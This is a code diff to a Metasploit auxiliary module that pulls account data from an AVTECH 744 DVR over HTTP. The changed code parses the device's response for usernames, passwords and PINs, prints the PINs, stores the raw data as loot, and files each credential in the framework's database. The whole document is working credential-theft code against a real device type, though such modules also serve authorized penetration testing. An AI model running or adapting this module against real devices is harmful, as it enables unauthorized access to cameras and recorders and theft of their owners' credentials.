@@ -3,6 +3,7 @@ require 'msf/core'
     class Metasploit3 < Msf::Auxiliary
 
         include Msf::Exploit::Remote::HttpClient
+        include Msf::Auxiliary::Report
 
         def initialize(info = {})
             super(update_info(info,
@@ -34,19 +35,76 @@ require 'msf/core'
                 }
             })
 
-            if (res != nil)
-                res.body.each_line { |line|
-                    split = line.split('=')
-                    key = split[0]
-                    value = split[1]
-                    if (key && value)
-                        print_good("#{key} - #{value}")
+            unless res
+                fail_with(Failure::Unreachable, "No response received from the target")
+            end
+
+            unless res.code == 200
+                fail_with(Failure::Unknown, "An unknown error occured")
+            end
+
+            raw_collection = extract_data(res.body)
+            extract_creds(raw_collection)
+
+            p = store_loot('avtech744.dvr.accounts', 'text/plain', rhost, res.body)
+            print_good("avtech744.dvr.accounts stored in #{p}")
+        end
+
+        def extract_data(body)
+            raw_collection = []
+            body.each_line do |line|
+                key, value = line.split('=')
+                if key && value
+                    _, second, third = key.split('.')
+                    if third
+                        index = second.slice(second.length - 1).to_i
+                        raw_collection[index] = raw_collection[index] ||= {}
+                        case third
+                        when "Username"
+                            raw_collection[index][:username] = value.strip!
+                        when "Password"
+                            raw_collection[index][:password] = value.strip!
+                        end
+                    elsif second.include? "Password"
+                          print_good("PIN Retrieved: #{key} - #{value.strip!}")
                     end
-                }
-                p = store_loot('avtech744.dvr.accounts', 'text/plain', rhost, res.body)
-                print_good("avtech744.dvr.accounts stored in #{p}")
-            else
-                print_error("Unable to receive a response")
+                end
+            end
+            raw_collection
+        end
+
+        def extract_creds(raw_collection)
+            raw_collection.each do |raw|
+                if raw
+                    service_data = {
+                        address: rhost,
+                        port: rport,
+                        service_name: 'http',
+                        protocol: 'tcp',
+                        workspace_id: myworkspace_id
+                    }
+
+                    credential_data = {
+                        module_fullname: self.fullname,
+                        origin_type: :service,
+                        private_data: raw[:password],
+                        private_type: :password,
+                        username: raw[:username]
+                    }
+
+                    credential_data.merge!(service_data)
+
+                    credential_core = create_credential(credential_data)
+
+                    login_data = {
+                        core: credential_core,
+                        status: Metasploit::Model::Login::Status::UNTRIED
+                    }
+
+                    login_data.merge!(service_data)
+
+                    create_credential_login(login_data)
+                end
             end
         end
     end
